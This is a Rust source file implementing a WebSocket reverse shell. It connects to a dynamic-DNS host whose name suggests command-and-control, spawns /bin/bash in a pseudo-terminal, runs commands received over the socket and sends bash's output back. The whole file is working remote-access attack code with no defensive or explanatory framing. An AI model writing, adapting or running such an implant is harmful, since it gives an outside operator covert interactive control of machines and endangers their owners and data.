use futures_util::{SinkExt, StreamExt};
use portable_pty::{CommandBuilder, PtySize, PtySystem, NativePtySystem};
use std::io::{Read, Write};
use std::thread;
use tokio::sync::mpsc;
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};

#[tokio::main]
async fn main() {
    let url = "ws://yadiec2.freedynamicdns.net:8080/ws";
    println!("Connecting to {}...", url);

    // 1. Connect to the WebSocket
    let (ws_stream, _) = connect_async(url).await.expect("Failed to connect");
    let (mut ws_sender, mut ws_receiver) = ws_stream.split();

    // 2. Setup the PTY (Pseudo-Terminal)
    let pty_system = NativePtySystem::default();
    let pair = pty_system
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
        .unwrap();

    // 3. Spawn Bash inside the PTY
    let cmd = CommandBuilder::new("/bin/bash");
    let mut child = pair.slave.spawn_command(cmd).unwrap();
    
    // Release the slave side as it's now owned by the child process
    drop(pair.slave);

    let mut pty_reader = pair.master.try_clone_reader().unwrap();
    let mut pty_writer = pair.master.take_writer().unwrap();

    // 4. Task: Read from PTY and send to WebSocket
    let (tx, mut rx) = mpsc::channel::<String>(100);
    thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        while let Ok(n) = pty_reader.read(&mut buffer) {
            if n == 0 { break; }
            let output = String::from_utf8_lossy(&buffer[..n]).to_string();
            let _ = tx.blocking_send(output);
        }
    });

    // 5. Main Loop: Handle incoming/outgoing data
    loop {
        tokio::select! {
            // Receive from WebSocket -> Write to Bash Stdin
            Some(msg) = ws_receiver.next() => {
                if let Ok(Message::Text(text)) = msg {
                    // Check for the literal string sender might be using
                    if text.contains("\\x03") || text.as_bytes() == &[3] {
                        // Send the raw byte 3 (ETX)
                        let _ = pty_writer.write_all(&[3]);
                        let _ = pty_writer.flush();
                    } else {
                        // Normal command processing
                        let clean_cmd = format!("{}\r", text.trim().trim_matches('"'));
                        let _ = pty_writer.write_all(clean_cmd.as_bytes());
                        let _ = pty_writer.flush();
                    }
                }
            }
            // Receive from Bash Stdout -> Send to WebSocket
            Some(output) = rx.recv() => {
                let _ = ws_sender.send(Message::Text(output)).await;
            }
        }

        // Check if the bash process died
        if let Ok(Some(_)) = child.try_wait() {
            println!("Bash process exited.");
            break;
        }
    }
}
